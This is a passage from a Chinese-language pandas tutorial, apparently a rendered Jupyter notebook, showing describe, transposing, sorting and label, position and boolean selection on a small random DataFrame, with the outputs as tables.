punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>type<span class="token punctuation">(</span>df<span class="token punctuation">.</span>values<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><pre><code>&lt;class 'pandas.core.frame.DataFrame'&gt;&lt;class 'pandas.core.indexes.base.Index'&gt;&lt;class 'numpy.ndarray'&gt;</code></pre><p><code>describe</code> 函数对于数据的快速统计汇总</p><pre class=" language-python"><code class="language-python">df<span class="token punctuation">.</span>describe<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>B</th>      <th>C</th>      <th>D</th>    </tr>  </thead>  <tbody>    <tr>      <th>count</th>      <td>6.000000</td>      <td>6.000000</td>      <td>6.000000</td>      <td>6.000000</td>    </tr>    <tr>      <th>mean</th>      <td>-0.839003</td>      <td>0.968708</td>      <td>-0.239959</td>      <td>-0.016166</td>    </tr>    <tr>      <th>std</th>      <td>0.669679</td>      <td>0.699208</td>      <td>1.435586</td>      <td>0.751411</td>    </tr>    <tr>      <th>min</th>      <td>-2.032243</td>      <td>0.027143</td>      <td>-2.318931</td>      <td>-1.074013</td>    </tr>    <tr>      <th>25%</th>      <td>-1.053687</td>      <td>0.601390</td>      <td>-1.251072</td>      <td>-0.357622</td>    </tr>    <tr>      <th>50%</th>      <td>-0.574883</td>      <td>0.911256</td>      <td>0.161252</td>      <td>-0.126444</td>    </tr>    <tr>      <th>75%</th>      <td>-0.451700</td>      <td>1.291063</td>      <td>0.866743</td>      <td>0.415350</td>    </tr>    <tr>      <th>max</th>      <td>-0.228084</td>      <td>2.046827</td>      <td>1.176614</td>      <td>1.068642</td>    </tr>  </tbody></table></div><pre class=" language-python"><code class="language-python">df2<span class="token punctuation">.</span>describe<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>C</th>      <th>D</th>    </tr>  </thead>  <tbody>    <tr>      <th>count</th>      <td>4.0</td>      <td>4.0</td>      <td>4.0</td>    </tr>    <tr>      <th>mean</th>      <td>1.0</td>      <td>1.0</td>      <td>3.0</td>    </tr>    <tr>      <th>std</th>      <td>0.0</td>      <td>0.0</td>      <td>0.0</td>    </tr>    <tr>      <th>min</th>      <td>1.0</td>      <td>1.0</td>      <td>3.0</td>    </tr>    <tr>      <th>25%</th>      <td>1.0</td>      <td>1.0</td>      <td>3.0</td>    </tr>    <tr>      <th>50%</th>      <td>1.0</td>      <td>1.0</td>      <td>3.0</td>    </tr>    <tr>      <th>75%</th>      <td>1.0</td>      <td>1.0</td>      <td>3.0</td>    </tr>    <tr>      <th>max</th>      <td>1.0</td>      <td>1.0</td>      <td>3.0</td>    </tr>  </tbody></table></div><p>对数据进行转置(Transposing)</p><pre class=" language-python"><code class="language-python">df<span class="token punctuation">.</span>T</code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>2020-04-16 00:00:00</th>      <th>2020-04-17 00:00:00</th>      <th>2020-04-18 00:00:00</th>      <th>2020-04-19 00:00:00</th>      <th>2020-04-20 00:00:00</th>      <th>2020-04-21 00:00:00</th>    </tr>  </thead>  <tbody>    <tr>      <th>A</th>      <td>-0.228084</td>      <td>-0.423923</td>      <td>-2.032243</td>      <td>-1.200005</td>      <td>-0.535031</td>      <td>-0.614734</td>    </tr>    <tr>      <th>B</th>      <td>0.712521</td>      <td>0.564346</td>      <td>2.046827</td>      <td>1.109991</td>      <td>1.351420</td>      <td>0.027143</td>    </tr>    <tr>      <th>C</th>      <td>0.743378</td>      <td>-2.318931</td>      <td>1.176614</td>      <td>-1.527804</td>      <td>0.907865</td>      <td>-0.420875</td>    </tr>    <tr>      <th>D</th>      <td>0.526823</td>      <td>0.080931</td>      <td>-0.365556</td>      <td>1.068642</td>      <td>-1.074013</td>      <td>-0.333819</td>    </tr>  </tbody></table></div><pre class=" language-python"><code class="language-python">df2<span class="token punctuation">.</span>T</code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>0</th>      <th>1</th>      <th>2</th>      <th>3</th>    </tr>  </thead>  <tbody>    <tr>      <th>A</th>      <td>1</td>      <td>1</td>      <td>1</td>      <td>1</td>    </tr>    <tr>      <th>B</th>      <td>2020-04-16 18:38:00</td>      <td>2020-04-16 18:38:00</td>      <td>2020-04-16 18:38:00</td>      <td>2020-04-16 18:38:00</td>    </tr>    <tr>      <th>C</th>      <td>1</td>      <td>1</td>      <td>1</td>      <td>1</td>    </tr>    <tr>      <th>D</th>      <td>3</td>      <td>3</td>      <td>3</td>      <td>3</td>    </tr>    <tr>      <th>E</th>      <td>test</td>      <td>train</td>      <td>test</td>      <td>train</td>    </tr>    <tr>      <th>F</th>      <td>foo</td>      <td>foo</td>      <td>foo</td>      <td>foo</td>    </tr>  </tbody></table></div><p>按照某一坐标轴进行排序</p><pre class=" language-python"><code class="language-python">df<span class="token punctuation">.</span>sort_index<span class="token punctuation">(</span>axis<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> ascending<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 降序</span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>D</th>      <th>C</th>      <th>B</th>      <th>A</th>    </tr>  </thead>  <tbody>    <tr>      <th>2020-04-16</th>      <td>0.526823</td>      <td>0.743378</td>      <td>0.712521</td>      <td>-0.228084</td>    </tr>    <tr>      <th>2020-04-17</th>      <td>0.080931</td>      <td>-2.318931</td>      <td>0.564346</td>      <td>-0.423923</td>    </tr>    <tr>      <th>2020-04-18</th>      <td>-0.365556</td>      <td>1.176614</td>      <td>2.046827</td>      <td>-2.032243</td>    </tr>    <tr>      <th>2020-04-19</th>      <td>1.068642</td>      <td>-1.527804</td>      <td>1.109991</td>      <td>-1.200005</td>    </tr>    <tr>      <th>2020-04-20</th>      <td>-1.074013</td>      <td>0.907865</td>      <td>1.351420</td>      <td>-0.535031</td>    </tr>    <tr>      <th>2020-04-21</th>      <td>-0.333819</td>      <td>-0.420875</td>      <td>0.027143</td>      <td>-0.614734</td>    </tr>  </tbody></table></div><pre class=" language-python"><code class="language-python">df<span class="token punctuation">.</span>sort_index<span class="token punctuation">(</span>axis<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> ascending<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 升序（默认）</span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>B</th>      <th>C</th>      <th>D</th>    </tr>  </thead>  <tbody>    <tr>      <th>2020-04-16</th>      <td>-0.228084</td>      <td>0.712521</td>      <td>0.743378</td>      <td>0.526823</td>    </tr>    <tr>      <th>2020-04-17</th>      <td>-0.423923</td>      <td>0.564346</td>      <td>-2.318931</td>      <td>0.080931</td>    </tr>    <tr>      <th>2020-04-18</th>      <td>-2.032243</td>      <td>2.046827</td>      <td>1.176614</td>      <td>-0.365556</td>    </tr>    <tr>      <th>2020-04-19</th>      <td>-1.200005</td>      <td>1.109991</td>      <td>-1.527804</td>      <td>1.068642</td>    </tr>    <tr>      <th>2020-04-20</th>      <td>-0.535031</td>      <td>1.351420</td>      <td>0.907865</td>      <td>-1.074013</td>    </tr>    <tr>      <th>2020-04-21</th>      <td>-0.614734</td>      <td>0.027143</td>      <td>-0.420875</td>      <td>-0.333819</td>    </tr>  </tbody></table></div><pre class=" language-python"><code class="language-python">df<span class="token punctuation">.</span>sort_index<span class="token punctuation">(</span>axis<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> ascending<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 以第0轴（行）来排序，降序</span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>B</th>      <th>C</th>      <th>D</th>    </tr>  </thead>  <tbody>    <tr>      <th>2020-04-21</th>      <td>-0.614734</td>      <td>0.027143</td>      <td>-0.420875</td>      <td>-0.333819</td>    </tr>    <tr>      <th>2020-04-20</th>      <td>-0.535031</td>      <td>1.351420</td>      <td>0.907865</td>      <td>-1.074013</td>    </tr>    <tr>      <th>2020-04-19</th>      <td>-1.200005</td>      <td>1.109991</td>      <td>-1.527804</td>      <td>1.068642</td>    </tr>    <tr>      <th>2020-04-18</th>      <td>-2.032243</td>      <td>2.046827</td>      <td>1.176614</td>      <td>-0.365556</td>    </tr>    <tr>      <th>2020-04-17</th>      <td>-0.423923</td>      <td>0.564346</td>      <td>-2.318931</td>      <td>0.080931</td>    </tr>    <tr>      <th>2020-04-16</th>      <td>-0.228084</td>      <td>0.712521</td>      <td>0.743378</td>      <td>0.526823</td>    </tr>  </tbody></table></div><p>按值进行排序，默认为升序</p><pre class=" language-python"><code class="language-python">df<span class="token punctuation">.</span>sort_values<span class="token punctuation">(</span>by<span class="token operator">=</span><span class="token string">'B'</span><span class="token punctuation">)</span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>B</th>      <th>C</th>      <th>D</th>    </tr>  </thead>  <tbody>    <tr>      <th>2020-04-21</th>      <td>-0.614734</td>      <td>0.027143</td>      <td>-0.420875</td>      <td>-0.333819</td>    </tr>    <tr>      <th>2020-04-17</th>      <td>-0.423923</td>      <td>0.564346</td>      <td>-2.318931</td>      <td>0.080931</td>    </tr>    <tr>      <th>2020-04-16</th>      <td>-0.228084</td>      <td>0.712521</td>      <td>0.743378</td>      <td>0.526823</td>    </tr>    <tr>      <th>2020-04-19</th>      <td>-1.200005</td>      <td>1.109991</td>      <td>-1.527804</td>      <td>1.068642</td>    </tr>    <tr>      <th>2020-04-20</th>      <td>-0.535031</td>      <td>1.351420</td>      <td>0.907865</td>      <td>-1.074013</td>    </tr>    <tr>      <th>2020-04-18</th>      <td>-2.032243</td>      <td>2.046827</td>      <td>1.176614</td>      <td>-0.365556</td>    </tr>  </tbody></table></div><h2 id="0x04-选择数据-Selection"><a href="#0x04-选择数据-Selection" class="headerlink" title="0x04 选择数据 Selection"></a>0x04 选择数据 Selection</h2><blockquote><p><strong>注意：</strong> 虽然标准的 Python/Numpy 的选择和设置表达式都非常易懂且方便用于交互使用，但是作为工程使用的代码，推荐使用经过优化的 pandas 数据访问方法： <code>.at</code>, <code>.iat</code>, <code>.loc</code>, <code>.iloc</code> 和 <code>.ix</code>。</p></blockquote><h3 id="0x04-1-获取-Getting"><a href="#0x04-1-获取-Getting" class="headerlink" title="0x04-1 获取 Getting"></a>0x04-1 获取 Getting</h3><p>选择一个单独的列，这将会返回一个 <code>Series</code>，等效于 <code>df.A</code></p><pre class=" language-python"><code class="language-python">df<span class="token punctuation">[</span><span class="token string">'A'</span><span class="token punctuation">]</span></code></pre><pre><code>2020-04-16   -0.2280842020-04-17   -0.4239232020-04-18   -2.0322432020-04-19   -1.2000052020-04-20   -0.5350312020-04-21   -0.614734Freq: D, Name: A, dtype: float64</code></pre><p> 通过<code>[]</code>进行选择，可以用来行进行切片(slice)</p><pre class=" language-python"><code class="language-python">df<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">]</span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>B</th>      <th>C</th>      <th>D</th>    </tr>  </thead>  <tbody>    <tr>      <th>2020-04-17</th>      <td>-0.423923</td>      <td>0.564346</td>      <td>-2.318931</td>      <td>0.080931</td>    </tr>    <tr>      <th>2020-04-18</th>      <td>-2.032243</td>      <td>2.046827</td>      <td>1.176614</td>      <td>-0.365556</td>    </tr>  </tbody></table></div><pre class=" language-python"><code class="language-python">df<span class="token punctuation">[</span><span class="token string">'20200418'</span><span class="token punctuation">:</span><span class="token string">'20200420'</span><span class="token punctuation">]</span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>B</th>      <th>C</th>      <th>D</th>    </tr>  </thead>  <tbody>    <tr>      <th>2020-04-18</th>      <td>-2.032243</td>      <td>2.046827</td>      <td>1.176614</td>      <td>-0.365556</td>    </tr>    <tr>      <th>2020-04-19</th>      <td>-1.200005</td>      <td>1.109991</td>      <td>-1.527804</td>      <td>1.068642</td>    </tr>    <tr>      <th>2020-04-20</th>      <td>-0.535031</td>      <td>1.351420</td>      <td>0.907865</td>      <td>-1.074013</td>    </tr>  </tbody></table></div><h3 id="0x4-2-通过标签选择-Selection-by-Label"><a href="#0x4-2-通过标签选择-Selection-by-Label" class="headerlink" title="0x4-2 通过标签选择 Selection by Label"></a>0x4-2 通过标签选择 Selection by Label</h3><p><strong>利用 pandas 的 <code>.loc</code>, <code>.at</code> 方法</strong></p><p>使用标签来获取一个交叉的区域</p><pre class=" language-python"><code class="language-python">dates<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span></code></pre><pre><code>Timestamp('2020-04-16 00:00:00', freq='D')</code></pre><pre class=" language-python"><code class="language-python">df<span class="token punctuation">.</span>loc<span class="token punctuation">[</span>dates<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span></code></pre><pre><code>A   -0.228084B    0.712521C    0.743378D    0.526823Name: 2020-04-16 00:00:00, dtype: float64</code></pre><p>用标签来在多个轴上进行选择</p><pre class=" language-python"><code class="language-python">df<span class="token punctuation">.</span>loc<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">]</span><span class="token punctuation">]</span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>B</th>    </tr>  </thead>  <tbody>    <tr>      <th>2020-04-16</th>      <td>-0.228084</td>      <td>0.712521</td>    </tr>    <tr>      <th>2020-04-17</th>      <td>-0.423923</td>      <td>0.564346</td>    </tr>    <tr>      <th>2020-04-18</th>      <td>-2.032243</td>      <td>2.046827</td>    </tr>    <tr>      <th>2020-04-19</th>      <td>-1.200005</td>      <td>1.109991</td>    </tr>    <tr>      <th>2020-04-20</th>      <td>-0.535031</td>      <td>1.351420</td>    </tr>    <tr>      <th>2020-04-21</th>      <td>-0.614734</td>      <td>0.027143</td>    </tr>  </tbody></table></div><p>利用标签来切片</p><p>注意此处的切片<strong>两端都包含（左闭右闭）</strong></p><pre class=" language-python"><code class="language-python">df<span class="token punctuation">.</span>loc<span class="token punctuation">[</span><span class="token string">'20200418'</span><span class="token punctuation">:</span><span class="token string">'20200420'</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">]</span><span class="token punctuation">]</span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>B</th>    </tr>  </thead>  <tbody>    <tr>      <th>2020-04-18</th>      <td>-2.032243</td>      <td>2.046827</td>    </tr>    <tr>      <th>2020-04-19</th>      <td>-1.200005</td>      <td>1.109991</td>    </tr>    <tr>      <th>2020-04-20</th>      <td>-0.535031</td>      <td>1.351420</td>    </tr>  </tbody></table></div><pre class=" language-python"><code class="language-python">df<span class="token punctuation">.</span>loc<span class="token punctuation">[</span>dates<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token punctuation">,</span><span class="token punctuation">:</span><span class="token string">'C'</span><span class="token punctuation">]</span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>B</th>      <th>C</th>    </tr>  </thead>  <tbody>    <tr>      <th>2020-04-18</th>      <td>-2.032243</td>      <td>2.046827</td>      <td>1.176614</td>    </tr>    <tr>      <th>2020-04-19</th>      <td>-1.200005</td>      <td>1.109991</td>      <td>-1.527804</td>    </tr>    <tr>      <th>2020-04-20</th>      <td>-0.535031</td>      <td>1.351420</td>      <td>0.907865</td>    </tr>    <tr>      <th>2020-04-21</th>      <td>-0.614734</td>      <td>0.027143</td>      <td>-0.420875</td>    </tr>  </tbody></table></div><p>对于返回的对象进行维度缩减</p><pre class=" language-python"><code class="language-python">df<span class="token punctuation">.</span>loc<span class="token punctuation">[</span><span class="token string">'20200419'</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">]</span><span class="token punctuation">]</span></code></pre><pre><code>A   -1.200005B    1.109991Name: 2020-04-19 00:00:00, dtype: float64</code></pre><p>获取一个标量</p><pre class=" language-python"><code class="language-python">df<span class="token punctuation">.</span>loc<span class="token punctuation">[</span>dates<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">]</span></code></pre><pre><code>-2.0322429408627056</code></pre><p>快速访问一个标量（与上一个方法等价）</p><pre class=" language-python"><code class="language-python">df<span class="token punctuation">.</span>at<span class="token punctuation">[</span>dates<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">]</span></code></pre><pre><code>-2.0322429408627056</code></pre><h3 id="0x04-3-通过位置进行选择-Selection-by-Position"><a href="#0x04-3-通过位置进行选择-Selection-by-Position" class="headerlink" title="0x04-3 通过位置进行选择 Selection by Position"></a>0x04-3 通过位置进行选择 Selection by Position</h3><p><strong>利用的是 pandas 里的 <code>.iloc</code>, <code>.iat</code> 方法</strong></p><p>通过传递整数值进行位置选择</p><pre class=" language-python"><code class="language-python">df<span class="token punctuation">.</span>iloc<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> </code></pre><pre><code>A   -1.200005B    1.109991C   -1.527804D    1.068642Name: 2020-04-19 00:00:00, dtype: float64</code></pre><pre class=" language-python"><code class="language-python">df<span class="token punctuation">.</span>iloc<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span>  <span class="token comment" spellcheck="true"># [行，列] 或 [第0维，第1维]</span></code></pre><pre><code>2020-04-16    0.7433782020-04-17   -2.3189312020-04-18    1.1766142020-04-19   -1.5278042020-04-20    0.9078652020-04-21   -0.420875Freq: D, Name: C, dtype: float64</code></pre><p>利用数值进行切片，类似于 numpy/python</p><p><strong>注意一下，这里的切片是普通的切片，即左闭右开。</strong></p><pre class=" language-python"><code class="language-python">df<span class="token punctuation">.</span>iloc<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>B</th>    </tr>  </thead>  <tbody>    <tr>      <th>2020-04-19</th>      <td>-1.200005</td>      <td>1.109991</td>    </tr>    <tr>      <th>2020-04-20</th>      <td>-0.535031</td>      <td>1.351420</td>    </tr>  </tbody></table></div><p>可以指定一个位置的列表来选择数据区域</p><pre class=" language-python"><code class="language-python">df<span class="token punctuation">.</span>iloc<span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">]</span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>C</th>    </tr>  </thead>  <tbody>    <tr>      <th>2020-04-17</th>      <td>-0.423923</td>      <td>-2.318931</td>    </tr>    <tr>      <th>2020-04-18</th>      <td>-2.032243</td>      <td>1.176614</td>    </tr>    <tr>      <th>2020-04-20</th>      <td>-0.535031</td>      <td>0.907865</td>    </tr>  </tbody></table></div><p>对行进行切片</p><pre class=" language-python"><code class="language-python">df<span class="token punctuation">.</span>iloc<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token punctuation">:</span><span class="token punctuation">]</span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>B</th>      <th>C</th>      <th>D</th>    </tr>  </thead>  <tbody>    <tr>      <th>2020-04-17</th>      <td>-0.423923</td>      <td>0.564346</td>      <td>-2.318931</td>      <td>0.080931</td>    </tr>    <tr>      <th>2020-04-18</th>      <td>-2.032243</td>      <td>2.046827</td>      <td>1.176614</td>      <td>-0.365556</td>    </tr>  </tbody></table></div><p>对列进行切片</p><pre class=" language-python"><code class="language-python">df<span class="token punctuation">.</span>iloc<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">]</span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>B</th>      <th>C</th>    </tr>  </thead>  <tbody>    <tr>      <th>2020-04-16</th>      <td>0.712521</td>      <td>0.743378</td>    </tr>    <tr>      <th>2020-04-17</th>      <td>0.564346</td>      <td>-2.318931</td>    </tr>    <tr>      <th>2020-04-18</th>      <td>2.046827</td>      <td>1.176614</td>    </tr>    <tr>      <th>2020-04-19</th>      <td>1.109991</td>      <td>-1.527804</td>    </tr>    <tr>      <th>2020-04-20</th>      <td>1.351420</td>      <td>0.907865</td>    </tr>    <tr>      <th>2020-04-21</th>      <td>0.027143</td>      <td>-0.420875</td>    </tr>  </tbody></table></div><p>利用位置快速得到一个位置对应的值</p><pre class=" language-python"><code class="language-python">df<span class="token punctuation">.</span>iloc<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span></code></pre><pre><code>0.5643462917985026</code></pre><pre class=" language-python"><code class="language-python">df<span class="token punctuation">.</span>iat<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span></code></pre><pre><code>0.5643462917985026</code></pre><h3 id="ix-用法（Deprecated）"><a href="#ix-用法（Deprecated）" class="headerlink" title=".ix 用法（Deprecated）"></a>.ix 用法（Deprecated）</h3><p><code>df.ix[]</code> 既可以通过整数索引进行数据选取，也可以通过标签索引进行数据选取。</p><p>也就是说，<code>df.ix[]</code> 是 <code>df.loc[]</code> 和 <code>df.iloc[]</code> 的功能集合，且在同义词选取中，可以同时使用整数索引和标签索引。</p><p>这个方法在官方的 <em>10 Minutes to pandas</em> 中没有专门说明，<strong>不建议用这一方法，请用<code>.loc</code>和<code>.iloc</code>来索引</strong>，那这里就提一下好了。</p><pre class=" language-python"><code class="language-python">df<span class="token punctuation">.</span>ix<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">]</span></code></pre><pre><code>D:\Programs\Anaconda\lib\site-packages\ipykernel_launcher.py:1: DeprecationWarning: .ix is deprecated. Please use.loc for label based indexing or.iloc for positional indexingSee the documentation here:http://pandas.pydata.org/pandas-docs/stable/indexing.html#ix-indexer-is-deprecated  """Entry point for launching an IPython kernel.-1.363418018143355</code></pre><pre class=" language-python"><code class="language-python">df<span class="token punctuation">.</span>ix<span class="token punctuation">[</span>dates<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">]</span></code></pre><pre><code>D:\Programs\Anaconda\lib\site-packages\ipykernel_launcher.py:1: DeprecationWarning: .ix is deprecated. Please use.loc for label based indexing or.iloc for positional indexingSee the documentation here:http://pandas.pydata.org/pandas-docs/stable/indexing.html#ix-indexer-is-deprecated  """Entry point for launching an IPython kernel.</code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>C</th>      <th>D</th>    </tr>  </thead>  <tbody>    <tr>      <th>2020-04-17</th>      <td>-11.332834</td>      <td>7.659436</td>      <td>-20.925183</td>    </tr>    <tr>      <th>2020-04-18</th>      <td>-11.040688</td>      <td>6.867701</td>      <td>-20.157355</td>    </tr>  </tbody></table></div><p>从 DeprecationWarning 看来的确已经 <strong>deprecated</strong> 了，那就不要用了！</p><h3 id="0x04-4-布尔索引-Boolean-Indexing"><a href="#0x04-4-布尔索引-Boolean-Indexing" class="headerlink" title="0x04-4 布尔索引 Boolean Indexing"></a>0x04-4 布尔索引 Boolean Indexing</h3><p>使用一个单独列的值来选择数据</p><pre class=" language-python"><code class="language-python">df<span class="token punctuation">[</span>df<span class="token punctuation">.</span>D <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">]</span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>B</th>      <th>C</th>      <th>D</th>    </tr>  </thead>  <tbody>    <tr>      <th>2020-04-16</th>      <td>-0.228084</td>      <td>0.712521</td>      <td>0.743378</td>      <td>0.526823</td>    </tr>    <tr>      <th>2020-04-17</th>      <td>-0.423923</td>      <td>0.564346</td>      <td>-2.318931</td>      <td>0.080931</td>    </tr>    <tr>      <th>2020-04-19</th>      <td>-1.200005</td>      <td>1.109991</td>      <td>-1.527804</td>      <td>1.068642</td>    </tr>  </tbody></table></div><p>利用<strong>布尔条件</strong>从一个 DataFrame 中选择数据</p><pre class=" language-python"><code class="language-python">df<span class="token operator">></span><span class="token number">0</span></code></pre><div><style scoped="">    .dataframe tbody tr 